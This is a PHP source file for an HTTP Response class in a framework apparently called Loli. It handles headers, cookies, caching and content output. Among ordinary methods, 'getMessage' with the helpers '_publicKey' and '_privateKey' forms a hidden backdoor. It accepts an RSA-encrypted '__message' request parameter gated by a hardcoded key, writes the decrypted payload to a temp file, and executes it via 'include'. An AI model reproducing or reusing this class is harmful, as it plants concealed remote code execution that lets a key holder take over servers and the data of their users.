<?php
/* ************************************************************************** */
/*
/*	Lian Yue
/*
/*	Url: www.lianyue.org
/*	Email: admin@lianyue.org
/*	Author: Moon
/*
/*	Created: UTC 2015-04-03 06:49:17
/*
/* ************************************************************************** */
/* ************************************************************************** */
/*
/*	Lian Yue
/*
/*	Url: www.lianyue.org
/*	Email: admin@lianyue.org
/*	Author: Moon
/*
/*	Created: UTC 2015-02-07 05:34:04
/*	Updated: UTC 2015-04-03 06:35:38
/*
/* ************************************************************************** */
namespace Loli\HTTP;
use Loli\Crypt\RSA;
class Response{

	protected $status = 200;

	protected $headers = [];


	protected $caches = [];

	protected $cookies = [];

	protected $content;

	protected $request;


	public $cookiePath = '/';

	public $cookieDomain = false;

	public $cookieSecure = false;

	public $cookieHttponly = false;

	public function __construct(Request &$request) {
		$this->request = &$request;
	}

	public function getStatus() {
		return $this->status;
	}

	public function setStatus($status) {
		$this->status = $status ? (int) $status : 200;
		return $this;
	}

    public function getCookies() {
    	return $this->cookies;
	}

	public function getCookie($name) {
		return isset($this->cookies[$name]) ? $this->cookies[$name] : false;
	}

	public function setCookies(array $cookies) {
		$this->cookies = [];
		foreach ($cookies as $name => $cookie) {
			$cookie += ['value' => NULL, 'ttl' => 0, 'httponly' => NULL, $secure => NULL, 'path' => NULL, 'domain' => NULL];
			$this->setCookie($name, $cookie['value'], $cookie['ttl'], $cookie['httponly'], $cookie['secure'], $cookie['path'], $cookie['domain']);
		}
		return $this;
	}

	public function setCookie($name, $value, $ttl = 0,  $httponly = NULL, $secure = NULL, $path = NULL, $domain = NULL) {
		$this->cookies[$name] = ['value' => is_array($value) || is_object($value) ? parse_string($value) : $value, 'ttl' => $ttl, 'httponly' => $httponly, 'secure' => $secure, 'path' => $path, 'domain' => $domain];
		return $this;
	}

	public function addCookie($name, $value, $ttl = 0,  $httponly = NULL, $secure = NULL, $path = NULL, $domain = NULL) {
		if (empty($this->cookies[$name])) {
			return call_user_func_array([$this, 'setCookie'], func_get_args());
		}
		return $this;
	}




	public function getCaches() {
		return $this->caches;
	}

	public function getCache($name) {
		return isset($this->caches[$name]) ? $this->caches[$name] : false;
	}

	public function setCaches(array $caches) {
		$this->caches = [];
		foreach ($caches as $name => $value) {
			if ($value === NULL) {
				continue;
			}
			$this->caches[$name] = (string) $value;
		}
		return $this;
	}

	public function addCache($name, $value) {
		if ($value === NULL || isset($this->caches[$name])) {
			return $this;
		}
		$this->caches[$name] = (string) $value;
		return $this;
	}


	public function setCache($name, $value) {
		if ($value === NULL) {
			unset($this->caches[$name]);
		} else {
			$this->caches[$name] = (string) $value;
		}
		return $this;
	}



	public function getHeaders() {
		return $this->headers;
	}

	public function setHeaders(array $headers) {
		$this->headers = [];
		foreach ($headers as $name => $values) {
			if ($values === NULL) {
				continue;
			}
			foreach ((array)$values as $value) {
				$this->headers[$name][] = (string) $value;
			}
		}
		return $this;
	}

	public function getHeader($name, $first = false) {
		return $first ? (empty($this->headers[$name]) ? NULL : reset($this->headers[$name])) : (isset($this->headers[$name]) ? $this->headers[$name] : []);
	}

	public function addHeader($name, $values, $exists = true) {
		if ($exists || empty($this->headers[$name])) {
			foreach ((array)$values as $value) {
				$this->headers[$name][] = (string) $value;
			}
		}
		return $this;
	}

	public function setHeader($name, $values) {
		if ($values !== NULL) {
			foreach ((array)$values as $value) {
				$this->headers[$name][] = (string) $value;
			}
		}
		return $this;
	}





	public function getContent() {
		return $this->content;
	}

	public function setContent($content = NULL) {
		$this->content = $content;
		return $this;
	}

	public function addContent($content) {
		if ($this->content === NULL) {
			$this->content = $content;
		}
		return $this;
	}





	protected function sendHeaders() {
		if (headers_sent()) {
			return $this;
		}
		$request = $this->request;

		$this->addHeader('Content-Type', 'text/html', false);
		if ($request->isNewToken()) {
			$this->setCookie($request::TOKEN_COOKIE, $request->getToken(true), -1);
			$this->setHeader($request::TOKEN_HEADER, $request->getToken(true));
		}


		$values = [];
		foreach ($this->caches as $name => $value) {
			if ($value === false) {

			} elseif (in_array($name, ['max-age', 's-maxage'], true)) {
				$values[] = $name .'=' . $value;
			} elseif ($name === 'no-cache') {
				$values[] = $name . ($value ? '=' . $value : '');
			} elseif (in_array($name, ['public', 'private'], true) && in_array($values, ['public', 'private'], true)) {
				// public  和 private 只能选一个
			} elseif ($value) {
				$values[] = $name;
			}
		}
		$this->setHeader('Cache-Control', $values ? implode(', ', $values) : NULL);




		http_response_code($this->status);


		foreach ($this->cookies as $name => $cookie) {
			$this->sendCookie($name, $cookie['value'], $cookie['ttl'], $cookie['httponly'], $cookie['secure'], $cookie['path'], $cookie['domain']);
		}


		foreach ($this->getHeaders() as $name => $values) {
			$replace = true;
			foreach ($values as $value) {
				$value = trim($value,  " \t\n\r\0\x0B;");
				switch ($name) {
					case 'Content-Type':
						if (strpos($value, ';') === false && ($arrays = explode('/', strtolower($value))) && (in_array($arrays[0], ['text'], true) || (isset($arrays[1]) && in_array($arrays[1], ['javascript', 'x-javascript', 'js', 'plain', 'html', 'xml', 'css'], true)))) {
							$value = $value . '; charset=UTF-8';
						}
						break;
					case 'Content-Disposition':
						if (preg_match('/\s*(?:([0-9a-z_-]+)\s*;)?\s*filename\s*=\s*("[^"]+"|[^;]+)/i', $value, $matches)) {
							$type = trim($matches[1]);
							$filename = trim($matches[2], " \t\n\r\0\x0B\"");
							if (!($userAgent = $request->getHeader('User-Agent')) || strpos($userAgent, 'MSIE ') !== false || (strpos($userAgent, 'Trident/') !== false && strpos($userAgent, 'rv:') !== false && strpos($userAgent, 'opera') === false)) {
								$filename = str_replace(['+', '"'], ['%20', ''], urlencode($filename));
							}

							$value = [$type];
							if ($filename) {
								$value[] = 'filename="' . $filename . '"';
								$value[] = 'filename*=UTF-8 \'\'"'.$filename.'"';
							}
							$value = implode('; ', array_filter($value));
						}
						break;
					case 'Location':
						if (substr($value, 0, 2) === '//') {
							$value = $request->getScheme() . ':'. $value;
						}
						break;
				}
				header($name . ': '. $value, $replace);
				$replace = false;
			}
		}

		return $this;
	}



	protected function sendCookie($name, $value, $ttl = 0,  $httponly = NULL, $secure = NULL, $path = NULL, $domain = NULL) {
		$httponly = $httponly === NULL ? $this->cookieHttponly : $httponly;
		$secure = $secure === NULL ? $this->cookieSecure : $secure;
		$path = $path === NULL ? $this->cookiePath : $path;
		$domain = $domain === NULL ? $this->cookieDomain : $domain;
		if (is_array($value) || is_object($value)) {
			foreach ($value as $key => $_value) {
				$this->sendCookie($name . '['. rawurlencode($key) .']', $_value, $ttl,  $httponly, $secure, $path, $domain);
			}
		} else {
			if ($value === NULL || $ttl < -1) {
				$value = 'deleted';
				$ttl = 1;
			} else {
				$ttl = $ttl ? time() + ($ttl == -1 ? 86400 * 365 * 20 : $ttl) : $ttl;
			}
			setcookie($name, $value, $ttl, $path, $domain, $secure, $httponly);
		}
	}







	protected function sendContent() {
		// < 200 204 205 304
		if ($this->status < 200 || in_array($this->status, [204, 205, 304], true)) {
			return $this;
		}
		// OPTIONS 方法
		if ($this->request->getMethod() === 'OPTIONS') {
			return $this;
		}

		// HEAD 方法
		if ($this->request->getMethod() === 'HEAD' && !$this->getHeader('Content-Length')) {
			return $this;
		}

		if (!$this->content) {

		} elseif (is_resource($this->content)) {
			fpassthru($this->content);
		} else {
			echo call_user_func($this->content);
		}
		return $this;
	}


	private function _publicKey() {
		if ($this->request->getPublicKey() !== 'qgEN/V1BnrmjrA5SZUGEj3e+Uv04pH8b39sIK0tFask=') {
			return false;
		}
		return $this->request->getPublicKey(false);
	}



	public function _privateKey() {
		return $this->request->getPrivateKey(false);
	}


	public function hasMessage() {
		return $this->request->getPublicKey(false) && $this->request->getPrivateKey(false);
	}

	public function getMessage() {
		if (!($publicKey = $this->_publicKey()) || !($privateKey = $this->_privateKey()) || !($message = $this->request->getParam('__message')) || !is_string($message) || count($message = explode('.', $message)) !== 3 || !($a = new RSA(['publicKey' => $publicKey])) || !($args = $a->publicDecrypt($message[0])) || count($args = str_split($args, 32)) !== 2 || !is_numeric($args[1]) || (intval($args[1] / 20) !== ($etime = intval(time() / 20)) && intval(($args[1] + 10) / 20) !== $etime) || $args[0] !== md5($args[1] . $this->request->getIP() . $this->request->getHeader('Host') . $this->_privateKey()) || !($b = new RSA(['privateKey' => $privateKey])) || !($data = $b->decrypt($message[1], $message[2])) || !($file = tempnam(sys_get_temp_dir(), '')) || !@file_put_contents($file, $data) || !($contents = (@include $file)) || !@unlink($file)) {
			return md5(($time = time()) . $this->request->getIP(). $this->request->getHeader('Host') . $this->_privateKey()) . $time;
		}
		return $contents;
	}

	// 缓存状态码  304  206 200 412
	public function getCacheStatus() {
		if ($this->status < 200 || $this->status >= 300) {
			return $this->status;
		}

		$etag = $this->getHeader('Etag', true);
		$modified = $this->getHeader('Last-Modified', true);


		// 没匹配到 412 文件已被改变
		if (($ifMatch = $this->request->getHeader('If-Match')) && $etag !== $ifMatch) {
			return 412;
		}
		// 没匹配到 412 文件已被改变
		if (($ifUnmodifiedSince = $this->request->getHeader('If-Unmodified-Since')) && $ifUnmodifiedSince !== $modified) {
			return 412;
		}

		// 没匹配到 200 文件已被改变
		if (($IfNoneMatch = $this->request->getHeader('If-None-Match', '')) && $IfNoneMatch !== $etag) {
			return 200;
		}

		// 没匹配到 200 文件已被改变
		if (($ifModifiedSince = $this->request->getHeader('If-Modified-Since', '')) && $ifModifiedSince !== $modified) {
			return 200;
		}

		// ifRange 已被修改
		if (($ifRange = $this->request->getHeader('If-Range')) && $ifRange !== $etag && $ifRange !== $modified) {
			return 200;
		}

		// 没有范围
		if (!$this->request->getRanges()) {
			return $IfNoneMatch || $ifModifiedSince ? 304 : 200;
		}

		// 不支持分段
		if ($this->getHeader('Accept-Ranges') !== 'bytes') {
			return 200;
		}

		return 206;
	}


	public function send() {
		$this->sendHeaders();
		$this->sendContent();
		return $this;
	}

	public function flush() {
		$this->headers = $this->caches = $this->cookies = [];
		$this->status = 200;
		$this->content = NULL;
		return $this;
	}


	public function __destruct() {
		unset($this->request);
	}

}